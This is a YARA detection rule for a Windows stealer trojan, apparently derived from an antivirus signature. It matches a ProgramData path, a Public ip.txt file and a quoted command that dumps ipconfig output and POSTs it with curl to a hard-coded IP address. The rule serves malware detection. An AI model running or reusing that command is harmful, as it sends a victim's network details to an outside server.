
rule Trojan_Win64_Stealer_SLWK_MTB{
	meta:
		description = "Trojan:Win64/Stealer.SLWK!MTB,SIGNATURE_TYPE_PEHSTR_EXT,06 00 06 00 03 00 00 "
		
	strings :
		$a_03_0 = {43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 51 41 58 53 61 66 65 5c [0-14] 2e 62 69 6e } //2
		$a_01_1 = {43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 69 70 2e 74 78 74 } //2 C:\Users\Public\ip.txt
		$a_01_2 = {63 6d 64 2e 65 78 65 20 2f 63 20 22 69 70 63 6f 6e 66 69 67 20 2f 61 6c 6c 20 3e 20 22 25 73 22 20 32 3e 26 31 20 26 26 20 63 75 72 6c 20 2d 58 20 50 4f 53 54 20 68 74 74 70 3a 2f 2f 31 32 30 2e 32 37 2e 32 31 31 2e 37 30 3a 38 30 30 30 2f 73 65 6e 64 20 2d 48 20 22 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a 20 74 65 78 74 2f 70 6c 61 69 6e 3b 20 63 68 61 72 73 65 74 3d 67 62 6b 22 20 2d 2d 64 61 74 61 2d 62 69 6e 61 72 79 20 40 22 25 73 22 20 32 3e 26 31 22 } //2 cmd.exe /c "ipconfig /all > "%s" 2>&1 && curl -X POST http://120.27.211.70:8000/send -H "Content-Type: text/plain; charset=gbk" --data-binary @"%s" 2>&1"
	condition:
		((#a_03_0  & 1)*2+(#a_01_1  & 1)*2+(#a_01_2  & 1)*2) >=6
 
}